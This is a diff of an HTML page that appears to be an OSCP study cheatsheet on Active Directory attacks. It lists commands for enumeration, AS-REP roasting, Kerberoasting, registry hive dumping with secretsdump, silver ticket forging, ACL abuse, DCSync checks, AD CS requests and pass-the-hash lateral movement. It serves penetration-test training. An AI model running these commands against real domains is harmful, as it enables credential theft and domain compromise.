href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">9.6.1 Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">9.6.2 Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">9.6.3 Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">9.6.4 Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">9.6.5 Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">9.6.6 Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary>9.7 Pivoting and tunneling</summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/">9.7.0 Stage 07: Pivoting and Tunneling</a></li><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">9.7.1 Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary>9.8 Evidence and reporting</summary><ul><li><a href="/oscp/reference/08-evidence-reporting/">9.8.0 Stage 08: Evidence and Reporting</a></li><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">9.8.1 Integrated Attack Tracking and Evidence</a></li></ul></details></li></ul></details></li><li><details open><summary>10 Cheatsheets</summary><ul><li><a href="/oscp/cheatsheets/">10.0 Cheatsheet Index</a></li><li><a href="/oscp/cheatsheets/active-directory/" aria-current="page">10.1 Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">10.2 AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">10.3 Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">10.4 Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">10.5 Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">10.6 Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">10.7 Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">10.8 Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">10.9 Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">10.10 Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">10.11 Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">10.12 Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">10.13 Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">10.14 Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">10.15 Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">10.16 Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">10.17 Windows Privilege Escalation Cheatsheet</a></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><aside id="page-index"><strong>On this page</strong><nav aria-label="On this page"><ul><li><a href="/oscp/cheatsheets/active-directory/#state-line">10.1.1 State line</a></li><li><a href="/oscp/cheatsheets/active-directory/#domaindc-truth">10.1.2 Domain/DC truth</a></li><li><a href="/oscp/cheatsheets/active-directory/#native--rsat--adsi">10.1.3 Native / RSAT / ADSI</a></li><li><a href="/oscp/cheatsheets/active-directory/#authenticated-ldap">10.1.4 Authenticated LDAP</a></li><li><a href="/oscp/cheatsheets/active-directory/#powerview">10.1.5 PowerView</a></li><li><a href="/oscp/cheatsheets/active-directory/#shares--sysvol--netlogon">10.1.6 Shares / SYSVOL / NETLOGON</a></li><li><a href="/oscp/cheatsheets/active-directory/#spns-acls-host-rights-and-sessions">10.1.7 SPNs, ACLs, host rights and sessions</a></li><li><a href="/oscp/cheatsheets/active-directory/#bloodhound-collection-and-decision">10.1.8 BloodHound collection and decision</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-8-1">10.1.8.1 Directory-only first pass; avoids workstation contact.</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-8-2">10.1.8.2 Add only when the selected host question needs it.</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#as-rep-roast">10.1.9 AS-REP roast</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-9-1">10.1.9.1 One known account</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-9-2">10.1.9.2 Supplied username list</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-9-3">10.1.9.3 Authenticated candidate discovery/request</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#kerberoast">10.1.10 Kerberoast</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-10-1">10.1.10.1 Enumerate first without requesting every ticket</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-10-2">10.1.10.2 Request one prioritized user account</a></li><li><a href="/oscp/cheatsheets/active-directory/#targeted-kerberoast-from-spn-write">10.1.10.3 Targeted Kerberoast from SPN write</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#tickets">10.1.11 Tickets</a><ul><li><a href="/oscp/cheatsheets/active-directory/#silver-ticket">10.1.11.1 Silver ticket</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#credential-access">10.1.12 Credential access</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-12-1">10.1.12.1 impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-12-2">10.1.12.2 Already-controlled DC/offline NTDS pair</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#acl-backed-identity-transitions">10.1.13 ACL-backed identity transitions</a></li><li><a href="/oscp/cheatsheets/active-directory/#dcsync">10.1.14 DCSync</a></li><li><a href="/oscp/cheatsheets/active-directory/#conditional-ad-cs">10.1.15 Conditional: AD CS</a></li><li><a href="/oscp/cheatsheets/active-directory/#lateral-movement-chooser">10.1.16 Lateral movement chooser</a><ul><li><a href="/oscp/cheatsheets/active-directory/#preflight-and-credential-classification">10.1.16.1 Preflight and credential classification</a></li><li><a href="/oscp/cheatsheets/active-directory/#smb-services-and-scheduled-tasks">10.1.16.2 SMB, services and scheduled tasks</a></li><li><a href="/oscp/cheatsheets/active-directory/#wmidcom">10.1.16.3 WMI/DCOM</a></li><li><a href="/oscp/cheatsheets/active-directory/#kerberos-cache">10.1.16.4 Kerberos cache</a></li><li><a href="/oscp/cheatsheets/active-directory/#winrm-and-rdp">10.1.16.5 WinRM and RDP</a></li><li><a href="/oscp/cheatsheets/active-directory/#key-and-ticket-transitions">10.1.16.6 Key and ticket transitions</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#re-enumerate">10.1.17 Re-enumerate</a></li><li><a href="/oscp/cheatsheets/active-directory/#discover-and-recognize-candidates">10.1.18 Discover and recognize candidates</a><ul><li><a href="/oscp/cheatsheets/active-directory/#map-active-directory-attack-paths">10.1.18.1 Map Active Directory attack paths</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-1">10.1.18.1.1 Find: Establish domain identity, DC, DNS, time and route</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-2">10.1.18.1.2 Find: Enumerate directory objects with native, LDAP and PowerView approaches</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-3">10.1.18.1.3 Find: Read domain shares, SYSVOL and NETLOGON for useful artifacts</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-4">10.1.18.1.4 Find: Identify service accounts and SPNs worth investigating</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-5">10.1.18.1.5 Find: Validate effective directory-object control</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-6">10.1.18.1.6 Find: Validate host access and volatile session candidates</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-1-7">10.1.18.1.7 Find: Collect focused BloodHound data and validate an attack path</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#gain-a-more-useful-domain-identity">10.1.18.2 Gain a more useful domain identity</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-1">10.1.18.2.1 Find: Obtain accessible live logon-session credential material</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-2">10.1.18.2.2 Find: Extract local account hashes from matched SAM and SYSTEM</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-3">10.1.18.2.3 Find: Extract LSA secrets and cached-domain verifiers</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-4">10.1.18.2.4 Find: Use Credential Manager and DPAPI with the protecting context</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-5">10.1.18.2.5 Find: Parse an offline domain database or select a justified remote collection path</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-6">10.1.18.2.6 Find: Request AS-REP material for an account without preauthentication</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-7">10.1.18.2.7 Find: Request a selected service ticket for offline service-account recovery</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-8">10.1.18.2.8 Find: Create a temporary SPN through an effective object right</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-9">10.1.18.2.9 Find: Inventory, convert and import tickets in the correct logon context</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-10">10.1.18.2.10 Find: Forge a service-scoped ticket from the correct service key</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-11">10.1.18.2.11 Find: Reset a target account password through a validated directory right</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-12">10.1.18.2.12 Find: Add a controlled identity to a group through effective membership rights</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-13">10.1.18.2.13 Find: Convert ownership or DACL control into a narrower useful right</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-14">10.1.18.2.14 Find: Use validated directory replication rights for bounded credential proof</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-15">10.1.18.2.15 Find: Conditional: trace GPO control to privileged policy consumption</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-16">10.1.18.2.16 Find: Conditional: use a validated delegation or RBCD relationship</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-17">10.1.18.2.17 Find: Conditional: validate an AD CS enrollment-to-authentication path</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-2-18">10.1.18.2.18 Find: Conditional: understand a realm-wide TGT forgery from KRBTGT material</a></li></ul></li><li><a href="/oscp/cheatsheets/active-directory/#move-to-another-host">10.1.18.3 Move to another host</a><ul><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-1">10.1.18.3.1 Find: Match route, destination service and effective authorization</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-2">10.1.18.3.2 Find: Execute through uploaded service creation using PsExec</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-3">10.1.18.3.3 Find: Execute commands through service command lines and SMB output</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-4">10.1.18.3.4 Find: Execute through remote Task Scheduler</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-5">10.1.18.3.5 Find: Execute through WMI or native CIM over DCOM</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-6">10.1.18.3.6 Find: Execute through an authorized DCOM application object</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-7">10.1.18.3.7 Find: Use WinRM, WinRS or PowerShell remoting</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-8">10.1.18.3.8 Find: Obtain an authorized RDP interactive session</a></li><li><a href="/oscp/cheatsheets/active-directory/#variant-10-1-18-3-9">10.1.18.3.9 Find: Select password, NT hash, key-to-ticket or ticket authentication</a></li></ul></li></ul></li></ul></nav></aside><main id="document" tabindex="-1"><article><a id="s-10-1"></a><h1 id="active-directory-cheatsheet">10.1 Active Directory Cheatsheet</h1>
 <p><a href="/oscp/cheatsheets/">← Cheatsheet index</a> | <a href="/oscp/reference/06-ad-lateral-movement/">Full AD procedures</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a>; <a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a>; <a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></p>
-<h2 id="state-line">State line</h2>
+<a id="s-10-1-1"></a><h2 id="state-line">10.1.1 State line</h2>
 <p><a href="/oscp/notes/ad-investigation/quick-reference/">Where to look and how to read the output</a> | <a href="/oscp/cheatsheets/ad-investigation/">Investigation command chooser</a></p>
 <pre><code class="language-text">IDENTITY -> GROUP -> RIGHT -> HOST/SERVICE -> SESSION/CREDENTIAL -> NEW IDENTITY
 </code></pre>
 <p>Keep separate identity, host, route and lead maps. Authentication, authorization, reachability and session presence are different claims. Full procedure: <a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">domain mapping</a>.</p>
-<h2 id="domaindc-truth">Domain/DC truth</h2>
+<a id="s-10-1-2"></a><h2 id="domaindc-truth">10.1.2 Domain/DC truth</h2>
 <pre><code class="language-cmd">whoami /all
 echo %USERDNSDOMAIN%
 echo %LOGONSERVER%
@@ -28,7 +28,7 @@ nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD'
 <blockquote>
 <p>Record source host, network identity, domain FQDN, DC FQDN/IP, DNS and time. If IP-based LDAP/SMB works but Kerberos fails, fix name/SPN/time/KDC routing first.</p>
 </blockquote>
-<h2 id="native--rsat--adsi">Native / RSAT / ADSI</h2>
+<a id="s-10-1-3"></a><h2 id="native--rsat--adsi">10.1.3 Native / RSAT / ADSI</h2>
 <pre><code class="language-cmd">net user /domain
 net user USER /domain
 net group /domain
@@ -54,7 +54,7 @@ $s.Filter = '(&#x26;(objectCategory=person)(objectClass=user))'
 $s.PropertiesToLoad.AddRange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description'))
 $s.FindAll() | ForEach-Object { $_.Properties }
 </code></pre>
-<h2 id="authenticated-ldap">Authenticated LDAP</h2>
+<a id="s-10-1-4"></a><h2 id="authenticated-ldap">10.1.4 Authenticated LDAP</h2>
 <pre><code class="language-bash">ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \
   -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \
   '(&#x26;(objectCategory=person)(objectClass=user))' \
@@ -98,7 +98,7 @@ ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \
 
 
 <table><thead><tr><th>LDAP result</th><th>Next decision</th></tr></thead><tbody><tr><td>Error 49</td><td>Recheck UPN/domain context, secret and account state</td></tr><tr><td>Stronger authentication/confidentiality required</td><td>Use permitted LDAPS/StartTLS or Kerberos/SASL path</td></tr><tr><td>Size limit / round result count</td><td>Add paging; narrow base/filter</td></tr><tr><td>Referral/partial results</td><td>Query the correct domain/partition or GC deliberately</td></tr><tr><td>Successful bind, empty search</td><td>Verify RootDSE base, filter, known object and attribute visibility</td></tr></tbody></table>
-<h2 id="powerview">PowerView</h2>
+<a id="s-10-1-5"></a><h2 id="powerview">10.1.5 PowerView</h2>
 <pre><code class="language-powershell">Import-Module .\PowerView.ps1
 Get-Command -Module PowerView
 Get-Domain
@@ -114,7 +114,7 @@ Find-LocalAdminAccess
 <blockquote>
 <p>PowerSploit is archived and forks differ. Course aliases such as <code>Get-NetUser</code> may exist; inspect the loaded copy with <code>Get-Command</code> and <code>Get-Help</code>.</p>
 </blockquote>
-<h2 id="shares--sysvol--netlogon">Shares / SYSVOL / NETLOGON</h2>
+<a id="s-10-1-6"></a><h2 id="shares--sysvol--netlogon">10.1.6 Shares / SYSVOL / NETLOGON</h2>
 <pre><code class="language-bash">nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares
 smbclient -L //DC_IP -U 'DOMAIN/USER'
 smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls'
@@ -123,7 +123,7 @@ smbclient //DC_IP/SHARE -U 'DOMAIN/USER'
 <blockquote>
 <p>List → connect → exact file read → exact file write are separate permissions. Inspect policy/logon/deployment material selectively for scripts, configuration, backups, connection strings and legacy GPP <code>cpassword</code>; return any secret to the credential workflow.</p>
 </blockquote>
-<h2 id="spns-acls-host-rights-and-sessions">SPNs, ACLs, host rights and sessions</h2>
+<a id="s-10-1-7"></a><h2 id="spns-acls-host-rights-and-sessions">10.1.7 SPNs, ACLs, host rights and sessions</h2>
 <pre><code class="language-powershell">Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,pwdlastset
 Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
   Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' }
@@ -138,11 +138,10 @@ PsLoggedOn.exe \\COMPUTER
 <blockquote>
 <p>SPN ≠ weak password. ACE ≠ effective exploitable control. <code>(Pwn3d!)</code> means administrative SMB context, not every remote protocol. Session output is volatile and can be blocked; session presence ≠ accessible credentials.</p>
 </blockquote>
-<h2 id="bloodhound-collection-and-decision">BloodHound collection and decision</h2>
-<pre><code class="language-powershell"># Directory-only first pass; avoids workstation contact.
-.\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip
-
-# Add only when the selected host question needs it.
+<a id="s-10-1-8"></a><h2 id="bloodhound-collection-and-decision">10.1.8 BloodHound collection and decision</h2>
+<h3 id="variant-10-1-8-1">10.1.8.1 Directory-only first pass; avoids workstation contact.</h3><pre><code class="language-powershell"># Directory-only first pass; avoids workstation contact.
+.\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip</code></pre>
+<h3 id="variant-10-1-8-2">10.1.8.2 Add only when the selected host question needs it.</h3><pre><code class="language-powershell"># Add only when the selected host question needs it.
 .\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip
 .\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip
 </code></pre>
@@ -164,19 +163,17 @@ bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All -
 <blockquote>
 <p>Validate every chosen edge manually; graph presence ≠ effective right, current session or reachable service.</p>
 </blockquote>
-<h2 id="as-rep-roast">AS-REP roast</h2>
+<a id="s-10-1-9"></a><h2 id="as-rep-roast">10.1.9 AS-REP roast</h2>
 <blockquote>
 <p><strong>Need:</strong> known username(s), KDC reachability and preauthentication disabled on the target account. <strong>Output:</strong> a <code>$krb5asrep$</code> verifier, not a password.</p>
 </blockquote>
-<pre><code class="language-bash"># One known account
+<h3 id="variant-10-1-9-1">10.1.9.1 One known account</h3><pre><code class="language-bash"># One known account
 impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request -dc-ip DC_IP \
-  -format hashcat -outputfile TARGET_USER.asrep
-
-# Supplied username list
+  -format hashcat -outputfile TARGET_USER.asrep</code></pre>
+<h3 id="variant-10-1-9-2">10.1.9.2 Supplied username list</h3><pre><code class="language-bash"># Supplied username list
 impacket-GetNPUsers DOMAIN/ -no-pass -request -usersfile users.txt \
-  -dc-ip DC_IP -format hashcat -outputfile asrep.hashes
-
-# Authenticated candidate discovery/request
+  -dc-ip DC_IP -format hashcat -outputfile asrep.hashes</code></pre>
+<h3 id="variant-10-1-9-3">10.1.9.3 Authenticated candidate discovery/request</h3><pre><code class="language-bash"># Authenticated candidate discovery/request
 impacket-GetNPUsers 'DOMAIN/USER:PASSWORD' -request -dc-ip DC_IP \
   -format hashcat -outputfile asrep.hashes
 
@@ -187,14 +184,13 @@ hashcat -m 18200 asrep.hashes wordlist.txt
 <blockquote>
 <p>Empty output can mean no candidate, a bad list/domain/DC, unreachable KDC or tool error. A returned verifier may still be infeasible to crack.</p>
 </blockquote>
-<h2 id="kerberoast">Kerberoast</h2>
+<a id="s-10-1-10"></a><h2 id="kerberoast">10.1.10 Kerberoast</h2>
 <blockquote>
 <p><strong>Need:</strong> any valid domain identity, KDC reachability and a selected SPN-bearing account. <strong>Output:</strong> a TGS verifier for offline guessing.</p>
 </blockquote>
-<pre><code class="language-bash"># Enumerate first without requesting every ticket
-impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
-
-# Request one prioritized user account
+<h3 id="variant-10-1-10-1">10.1.10.1 Enumerate first without requesting every ticket</h3><pre><code class="language-bash"># Enumerate first without requesting every ticket
+impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'</code></pre>
+<h3 id="variant-10-1-10-2">10.1.10.2 Request one prioritized user account</h3><pre><code class="language-bash"># Request one prioritized user account
 impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
   -outputfile TARGET_USER.tgs 'DOMAIN/USER:PASSWORD'
 </code></pre>
@@ -228,7 +224,7 @@ Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
 <blockquote>
 <p>Select by privilege, password age and downstream access. “No entries found” can be a query/auth/DC problem or genuinely no matching user SPN; it does not prove Kerberos is unavailable.</p>
 </blockquote>
-<h3 id="targeted-kerberoast-from-spn-write">Targeted Kerberoast from SPN write</h3>
+<a id="s-10-1-10-3"></a><h3 id="targeted-kerberoast-from-spn-write">10.1.10.3 Targeted Kerberoast from SPN write</h3>
 <pre><code class="language-powershell">setspn -S TEMP/TARGET_USER TARGET_USER
 setspn -Q TEMP/TARGET_USER
 Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
@@ -237,7 +233,7 @@ setspn -D TEMP/TARGET_USER TARGET_USER
 <blockquote>
 <p>Requires effective write access to the user's servicePrincipalName attribute. Use a unique SPN and remove it immediately; this changes directory state.</p>
 </blockquote>
-<h2 id="tickets">Tickets</h2>
+<a id="s-10-1-11"></a><h2 id="tickets">10.1.11 Tickets</h2>
 <pre><code class="language-cmd">klist
 klist tgt
 klist sessions
@@ -303,7 +299,7 @@ Rubeus.exe ptt /ticket:ticket.kirbi
 export KRB5CCNAME="$PWD/ticket.ccache"
 klist
 </code></pre>
-<h3 id="silver-ticket">Silver ticket</h3>
+<a id="s-10-1-11-1"></a><h3 id="silver-ticket">10.1.11.1 Silver ticket</h3>
 <pre><code class="language-bash">impacket-ticketer -nthash SERVICE_OR_MACHINE_NT_HASH -domain-sid DOMAIN_SID \
   -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER
 export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
@@ -312,7 +308,7 @@ klist
 <blockquote>
 <p>Requires the exact service/machine key, realm, domain SID and SPN. It is service-scoped; import success is not authorization. Modern PAC checks, wrong naming, stale keys or an unsupported service can invalidate the result.</p>
 </blockquote>
-<h2 id="credential-access">Credential access</h2>
+<a id="s-10-1-12"></a><h2 id="credential-access">10.1.12 Credential access</h2>
 
 
 
@@ -382,16 +378,15 @@ reg save HKLM\SAM .\SAM.hive /y
 reg save HKLM\SYSTEM .\SYSTEM.hive /y
 reg save HKLM\SECURITY .\SECURITY.hive /y
 </code></pre>
-<pre><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
-impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
-
-# Already-controlled DC/offline NTDS pair
+<h3 id="variant-10-1-12-1">10.1.12.1 impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL</h3><pre><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL</code></pre>
+<h3 id="variant-10-1-12-2">10.1.12.2 Already-controlled DC/offline NTDS pair</h3><pre><code class="language-bash"># Already-controlled DC/offline NTDS pair
 impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL
 </code></pre>
 <blockquote>
 <p>LSA protection or Credential Guard can block/isolate LSASS material without disproving the other sources. DCC2 is for offline password guessing (Hashcat mode 2100), not pass-the-hash.</p>
 </blockquote>
-<h2 id="acl-backed-identity-transitions">ACL-backed identity transitions</h2>
+<a id="s-10-1-13"></a><h2 id="acl-backed-identity-transitions">10.1.13 ACL-backed identity transitions</h2>
 <pre><code class="language-powershell">Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
   Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' }
 ConvertFrom-SID 'S-1-5-21-...'
@@ -444,7 +439,7 @@ Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Ve
 Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
 Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
 </code></pre>
-<h2 id="dcsync">DCSync</h2>
+<a id="s-10-1-14"></a><h2 id="dcsync">10.1.14 DCSync</h2>
 <pre><code class="language-powershell">Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
   Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
 </code></pre>
@@ -456,7 +451,7 @@ Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLL
 <blockquote>
 <p>Requires effective Replicating Directory Changes + Changes All at the domain root, with filtered-set rights where applicable. Request one approved account and stop after proof; local admin, LDAP access or an LDAP service ticket is insufficient.</p>
 </blockquote>
-<h2 id="conditional-ad-cs">Conditional: AD CS</h2>
+<a id="s-10-1-15"></a><h2 id="conditional-ad-cs">10.1.15 Conditional: AD CS</h2>
 <pre><code class="language-bash">certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled -vulnerable -stdout
 certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -target DC_HOST -ca CA_NAME -template TEMPLATE
 certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
@@ -464,7 +459,7 @@ certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
 <blockquote>
 <p>Evidence-led supplement, not core Block 11. Confirm enabled/published template, enrollment rights, EKUs, subject/SAN controls and approval/signature requirements before a request.</p>
 </blockquote>
-<h2 id="lateral-movement-chooser">Lateral movement chooser</h2>
+<a id="s-10-1-16"></a><h2 id="lateral-movement-chooser">10.1.16 Lateral movement chooser</h2>
 <blockquote>
 <p>Select by credential type, accepted authentication protocol, reachable service and the exact remote right. Authentication success is not execution success. Full procedure: <a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">lateral movement</a>.</p>
 </blockquote>
@@ -522,7 +517,7 @@ certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
 
 
 <table><thead><tr><th>Starting evidence</th><th>First justified path</th><th>Required condition</th><th>Main fallback</th></tr></thead><tbody><tr><td>Password + SMB admin</td><td>PsExec/SMBExec</td><td>445, admin share and SCM rights</td><td>WMIExec or ATExec if their RPC rights work</td></tr><tr><td>Password/hash + WMI rights</td><td>WMIExec</td><td>135 + dynamic RPC; SMB for normal output</td><td><code>-nooutput</code> with bounded side-effect proof</td></tr><tr><td>Password/hash + WinRM right</td><td>Evil-WinRM/WinRS</td><td>5985/5986 and endpoint authorization</td><td>PowerShell remoting from Windows</td></tr><tr><td>Password + remote-interactive right</td><td>RDP</td><td>3389, NLA and effective RDP logon right</td><td>WinRM or command execution</td></tr><tr><td>NT hash + Restricted Admin</td><td>FreeRDP <code>/pth</code></td><td>RDP Restricted Admin permitted; user is admin</td><td>SMB/WMI PtH</td></tr><tr><td>TGT/ccache</td><td>Kerberos-capable Impacket/WinRM path</td><td>FQDN/SPN, DNS, time and KDC route</td><td>Request the service ticket first</td></tr><tr><td>Service ticket</td><td>Only its exact service/host</td><td>Compatible SPN and client</td><td>Obtain a TGT or matching TGS</td></tr></tbody></table>
-<h3 id="preflight-and-credential-classification">Preflight and credential classification</h3>
+<a id="s-10-1-16-1"></a><h3 id="preflight-and-credential-classification">10.1.16.1 Preflight and credential classification</h3>
 <pre><code class="language-bash">nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET
 nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
 nxc smb TARGET -d DOMAIN -u USER -H NT_HASH
@@ -531,7 +526,7 @@ nxc smb TARGET -u Administrator -H NT_HASH --local-auth
 <blockquote>
 <p><code>(Pwn3d!)</code> is an SMB administrative-context cue, not proof of WinRM, WMI, RDP or every SMB execution method. Port 135 alone does not prove that negotiated dynamic RPC ports are reachable.</p>
 </blockquote>
